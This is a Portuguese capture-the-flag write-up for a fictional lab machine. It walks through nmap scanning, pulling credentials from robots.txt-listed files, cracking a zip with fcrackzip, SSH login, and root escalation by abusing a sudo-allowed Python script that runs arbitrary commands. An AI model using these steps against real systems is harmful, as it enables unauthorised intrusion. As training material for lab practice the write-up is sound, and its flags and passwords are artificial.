Writeup da Máquina Robot (CTF Imaginário)
1. Enumeração Inicial
Primeiro, identificamos a máquina alvo na rede. Usamos netdiscover ou arp-scan:

bash
sudo netdiscover -r 192.168.1.0/24
O IP da máquina Robot é 192.168.1.100.

Em seguida, escaneamos portas abertas com nmap:

bash
nmap -sV -sC -p- 192.168.1.100 -Pn
Resultado:

text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1
80/tcp open  http    Apache httpd 2.4.38
Apenas as portas 22 (SSH) e 80 (HTTP) estão abertas. Começamos pelo serviço web.

2. Exploração Web
Acessamos http://192.168.1.100 no navegador. Aparece uma página simples com um robô desenhado e o texto:
"Eu sou o Robot. Meu criador esqueceu um arquivo importante aqui..."

2.1. Robots.txt
Seguindo a dica, testamos o arquivo /robots.txt:

bash
curl http://192.168.1.100/robots.txt
Saída:

text
User-agent: *
Disallow: /secret_zone/
Disallow: /backup.zip
2.2. Explorando os diretórios
Acessamos /secret_zone/ – há um diretório listável com um único arquivo: note.txt.

Conteúdo de note.txt:

text
Robot, eu sei que você gosta de comandos. Aqui está sua senha: robot:4p0c4l1ps3!
Achamos uma possível credencial: usuário robot, senha 4p0c4l1ps3!.

2.3. Backup.zip
Também baixamos o arquivo /backup.zip:

bash
wget http://192.168.1.100/backup.zip
unzip backup.zip
O zip está protegido por senha. Usamos fcrackzip para quebrar:

bash
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt backup.zip
Senha encontrada: robot123. Dentro do zip, há um arquivo creds.txt com as mesmas credenciais já descobertas.

3. Acesso via SSH
Usamos as credenciais para logar via SSH:

bash
ssh robot@192.168.1.100
password: 4p0c4l1ps3!
Logado com sucesso. A flag do usuário está em /home/robot/user.txt:

bash
cat /home/robot/user.txt
Flag do usuário: CTF{r0b0t_1s_aliv3}

4. Escalação de Privilégio (Root)
Executamos sudo -l para ver comandos permitidos:

bash
sudo -l
Saída:

text
User robot may run the following commands:
    (ALL) NOPASSWD: /usr/bin/python3 /opt/robot_manager.py
Temos permissão para executar um script Python como root sem senha.

4.1. Analisando o script
Visualizamos o conteúdo do script:

bash
cat /opt/robot_manager.py
Código:

python
#!/usr/bin/env python3
import os

command = input("Comando do robô: ")
os.system(command)
O script simplesmente executa qualquer comando passado pelo usuário. Como ele roda com sudo e sem restrições, podemos abrir uma shell interativa.

Executamos:

bash
sudo /usr/bin/python3 /opt/robot_manager.py
Quando pedir o comando, digitamos:

bash
/bin/bash
Pronto! Agora estamos com shell de root.

4.2. Flag do root
A flag final está em /root/root.txt:

bash
cat /root/root.txt
Flag do root: CTF{robot_master_421}

5. Conclusão
A máquina Robot foi comprometida com técnicas básicas:

Enumeração de portas.

Descoberta de /robots.txt → diretório secreto e backup.zip.

Credenciais obtidas e acesso SSH.

Abuso de sudo em script Python vulnerável para escalar privilégio.